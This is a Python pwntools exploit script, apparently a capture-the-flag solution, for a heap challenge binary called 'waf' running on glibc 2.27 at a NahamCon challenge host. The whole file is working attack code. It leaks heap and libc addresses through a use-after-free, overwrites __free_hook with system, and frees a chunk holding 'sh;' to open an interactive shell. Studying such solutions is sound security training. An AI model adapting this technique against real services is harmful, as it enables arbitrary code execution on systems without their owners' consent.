#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./waf_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = gdb.debug([exe.path])
	elif args.REMOTE:
		r = remote("challenge.nahamcon.com", 30000)
	else:
		r = process([exe.path])
	return r


def create(r: remote | process, idx, size=0x18, data=b"", status="y"):
	r.sendlineafter(b"> ", b"1")
	r.sendlineafter(b": ", str(idx).encode())
	r.sendlineafter(b": ", str(size).encode())
	if size >= 1:
		r.sendlineafter(b": ", data)
	r.sendlineafter(b"]: ", status.encode())
	log.info(f"CREATED {idx}")


def edit(r: remote | process, chunk_idx, config_idx, size=0x18, data=b"", status="y"):
	r.sendlineafter(b"> ", b"2")
	r.sendlineafter(b": ", str(chunk_idx).encode())
	r.sendlineafter(b": ", str(config_idx).encode())
	r.sendlineafter(b": ", str(size).encode())
	r.sendlineafter(b": ", data)
	r.sendlineafter(b": ", status.encode())
	log.info(f"EDITED {chunk_idx} => {config_idx}")


def view(r: remote | process, idx):
	r.sendlineafter(b"> ", b"3")
	r.sendlineafter(b": ", str(idx).encode())
	r.recvuntil(b"ID: ")
	resp_id = r.recvline().strip()
	r.recvuntil(b"Setting: ")
	resp_setting = r.recvline().strip()
	r.recvuntil(b"active: ")
	resp_status = r.recvline().strip()
	log.info(f"VIEW {idx} = [{resp_id}, {resp_setting}, {resp_status}]")
	return [resp_id, resp_setting, resp_status]


def delete_last(r: remote | process):
	r.sendlineafter(b"> ", b"4")
	log.info("DELETED THE LAST INDEX")



def main():
	r = conn()

	create(r, 0, 0x418, b"A") # 0
	create(r, 1 , 0x78, b"B") # 1

	delete_last(r) # 1
	delete_last(r) # 0

	res = view(r, 0) 
	leak_heap = int(res[0].decode())
	heap_base = leak_heap & ~0xFFF
	heap_chunk_0 = heap_base + 0x260

	success(f'{hex(leak_heap)=}')
	success(f'{hex(heap_base)=}')
	success(f'{hex(heap_chunk_0)=}')



	offset = 8
	addr = heap_base + 0x280
	create(r, 0, 0x18, b"A"*offset + p64(addr)) # 0

	res = view(r, 1)
	leak_libc = u64(res[1].ljust(8, b'\x00'))
	libc.address = leak_libc - libc.symbols['__malloc_hook'] & ~0xFFF

	success(f'{hex(leak_libc)=}')
	success(f'{hex(libc.address)=}')

	delete_last(r)
	

	payload = b''.join([
		p64(0x100),
		p64(0x0) * 8,
		p64(libc.symbols['__free_hook']),
	])
	edit(r, 0, 0, 0x248, payload) # 0

	create(r, u32(b"sh;\x00"), 0x28, p64(libc.symbols["system"])) # 0

	r.sendlineafter(b'> ', b'6')

	r.interactive()


if __name__ == "__main__":
	main()
